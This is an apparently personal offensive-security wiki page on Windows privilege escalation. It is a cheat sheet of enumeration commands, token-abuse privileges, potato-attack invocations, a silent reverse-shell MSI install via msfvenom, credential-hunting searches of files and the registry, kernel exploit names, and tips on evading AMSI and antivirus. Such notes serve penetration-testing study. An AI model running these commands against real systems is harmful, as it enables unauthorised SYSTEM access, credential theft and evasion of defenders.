---
title: Privilege Escalation — Windows
permalink: /wiki/concepts/privilege-escalation-windows/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
redirect_from:
- /wiki/offsec-notes/concepts/privilege-escalation-windows/
---

**Category:** Windows / Post-Exploitation
**MITRE ATT&CK:** Privilege Escalation — TA0004
**Related:** [Privilege Escalation Linux](/wiki/concepts/privilege-escalation-linux/), [Active Directory Attacks](/wiki/concepts/active-directory-attacks/), [Post Exploitation](/wiki/concepts/post-exploitation/), [Mimikatz](/wiki/tools/mimikatz/)

## Overview
Windows privilege escalation involves moving from a low-privilege user or service account to SYSTEM, local Administrator, or a domain-privileged account. Vectors include service misconfigurations, token abuse, AlwaysInstallElevated, credential exposure, and unpatched vulnerabilities.

## How It Works

### Enumeration
```powershell
# Automated
.\winPEASx64.exe | Out-File winpeas.txt
.\PowerUp.ps1; Invoke-AllChecks
.\Seatbelt.exe -group=all

# Manual
whoami /priv          # Check for dangerous privileges
whoami /groups        # Group memberships
systeminfo            # OS version, patches
wmic qfe list         # Installed patches
net localgroup administrators
Get-LocalGroupMember Administrators
```

### Dangerous Privileges (Token Abuse)

| Privilege | Abuse |
|-----------|-------|
| `SeImpersonatePrivilege` | Potato attacks (JuicyPotato, PrintSpoofer, GodPotato) → SYSTEM |
| `SeAssignPrimaryTokenPrivilege` | Same potato family |
| `SeBackupPrivilege` | Read any file (SAM, NTDS.dit) |
| `SeRestorePrivilege` | Write any file |
| `SeTakeOwnershipPrivilege` | Take ownership of any object |
| `SeDebugPrivilege` | Read/write any process memory (dump LSASS) |
| `SeLoadDriverPrivilege` | Load malicious kernel driver |

**Potato attacks** target services running as SYSTEM (e.g., IIS/SQL Server worker processes get SeImpersonate by default).
```cmd
.\PrintSpoofer64.exe -i -c cmd.exe
.\GodPotato.exe -cmd "cmd /c whoami"
```

### Service Misconfigurations
- **Unquoted service paths:** Service path with spaces and no quotes → drop binary in intercepted path.
- **Weak service ACLs:** Can modify service binary or config → replace binary with payload.
- **Weak directory permissions on service binary:** Overwrite executable.

```powershell
# PowerUp
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
```

### Registry-Based
- **AlwaysInstallElevated:** MSI packages install as SYSTEM.
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```
- **Autorun weak permissions:** Writable autorun registry keys executed as higher-priv user on login.

### Credential Hunting
```cmd
# Saved credentials
cmdkey /list
runas /savecred /user:admin cmd.exe

# Config files
findstr /si password *.xml *.ini *.txt *.config
dir /s *pass* == *cred* == *vnc* == *.config

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # AutoLogon

# Unattend files
C:\Unattend.xml, C:\Windows\Panther\Unattend\Unattend.xml
```

### Kernel Exploits
- PrintNightmare (CVE-2021-34527) — SYSTEM via spooler
- HiveNightmare/SeriousSAM (CVE-2021-36934) — read SAM as non-admin
- MS17-010 EternalBlue — SMBv1 RCE (older systems)
- Check with Watson or wesng (Windows Exploit Suggester-NG)

## Detection & Evasion Notes
- Potato attacks generate token impersonation events.
- Service modification logged (System event log, 7040/7045).
- PowerUp / winPEAS execution triggers AMSI and AV.
- Use obfuscated or in-memory versions (Invoke-Obfuscation, AMSI bypass before loading).

## Tools
- `winPEAS` — comprehensive automated enumeration
- `PowerUp` (PowerSploit) — service/registry misconfig checks
- `Seatbelt` — security-oriented host enumeration
- `PrintSpoofer` / `GodPotato` / `JuicyPotatoNG` — token impersonation
- `Watson` / `wesng` — patch-level kernel exploit suggester
- `SharpUp` — .NET PowerUp equivalent

## References
- HackTricks Windows Privilege Escalation
- GTFOBins (Windows variant: LOLBAS — lolbas-project.github.io)
- MITRE ATT&CK TA0004
- FuzzySecurity Windows Privilege Escalation Fundamentals
